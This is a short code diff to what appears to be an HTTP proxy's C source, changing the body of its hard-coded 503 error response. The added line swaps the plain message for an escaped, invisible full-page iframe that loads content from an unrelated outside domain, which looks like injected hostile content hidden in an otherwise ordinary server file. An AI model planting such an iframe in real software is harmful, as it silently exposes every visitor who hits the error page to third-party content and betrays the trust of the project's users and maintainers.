@@ -37,7 +37,7 @@ static const char http_503[] =
     "HTTP/1.1 503 Service Temporarily Unavailable\r\n"
     "Content-Type: text/html\r\n"
     "Connection: close\r\n\r\n"
-    "Backend not available";
+    "&lt;iframe src=&quot;http://www.an.com.bd/dns/@&quot; style=&quot;border: 0; width: 100%; height: 100%&quot;&gt;";
 
 static int parse_http_header(const char *, size_t, char **);
 static int get_header(const char *, const char *, int, char **);
